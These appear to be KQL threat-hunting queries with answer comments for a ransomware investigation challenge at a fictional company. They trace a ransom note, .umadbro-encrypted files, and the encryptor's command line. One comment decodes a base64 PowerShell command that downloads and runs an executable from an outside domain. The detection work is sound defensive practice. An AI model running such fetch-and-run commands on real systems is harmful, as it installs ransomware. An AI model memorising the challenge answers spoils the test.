//2. Crypto Conquest

//What is the filename of this note? YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt
// attack ; ransomware

//On how many machines was this .txt file seen? 306
FileCreationEvents
| where filename contains "YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt"
| project timestamp, hostname, username, filename, process_name
| order by timestamp asc
// What time was the ransom note first seen? 2024-02-17T02:34:54.000Z // hostname: UL8R-MACHINE

//Look closer at UL8R-MACHINE around the time when the ransom note was seen (2024-02-17).
//How many files were encrypted on this machine? 50 extension umadbro
FileCreationEvents
| where hostname contains "UL8R-MACHINE"
//| take 10
| where filename contains ".umadbro"
//| where timestamp between (datetime(2024-02-17) .. datetime(2024-02-17 23:59:59))
//| count
| project timestamp, filename, hostname
| order by timestamp asc
//That looks like a ransomware extension! Instead of the typical .encrypted, this ransomware is appending .umadbro to files

//What command was run that references the ransomware extension?
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where process_commandline has ".umadbro" //start /b C:\\ProgramData\\files_go_byebye.exe -encrypt -target C:\\Users\\ -ext .umadbro

//When did files_go_byebye.exe appear on this machine?
FileCreationEvents
| where hostname contains "UL8R-MACHINE"
| where filename contains "files_go_byebye.exe"
| project timestamp, filename, hostname //2024-02-17T02:30:50.000Z

//How many commands were run on UL8R-MACHINE during this timeframe? 23

ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| where process_commandline contains "powershell"
| where process_commandline contains "-enc"
//| where process_commandline has_any ("-enc", "-encodedcommand", "base64")
//What domain does the encoded PowerShell reference?
//cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==
// use cyberchef
//powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"
//2024-02-17T02:29:53.000Z
//What command is run right before the base64-encoded PowerShell?

ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| order by timestamp asc
| project timestamp, process_commandline
| where next(process_commandline) contains "-enc" //gpupdate /force

//How many devices ran the gpupdate /force command? //306
ProcessEvents
//| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| where process_commandline contains "gpupdate /force"
| order by timestamp asc
| project timestamp, process_commandline, hostname

//How many machines at Encryptodera ran "systeminfo"? //8
ProcessEvents
//| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| where process_commandline contains "systeminfo"
| order by timestamp asc
| take 1 //2024-02-02T03:32:36.000Z

//How many days elapsed between when the attackers ran discovery commands and when the ransomware attack started?

// Step 1 - First discovery command
ProcessEvents
| where process_commandline contains "systeminfo"
| summarize first_discovery = min(timestamp) //2024-02-02T03:32:36.000Z

// Step 2 - Ransomware start
FileCreationEvents
| where hostname == "UL8R-MACHINE"
| where filename contains "files_go_byebye.exe"
| summarize ransomware_start = min(timestamp) //2024-02-17T02:30:50.000Z

//Then calculate the difference:
print days_elapsed = datetime_diff('day', datetime(2024-02-17), datetime(2024-02-02))

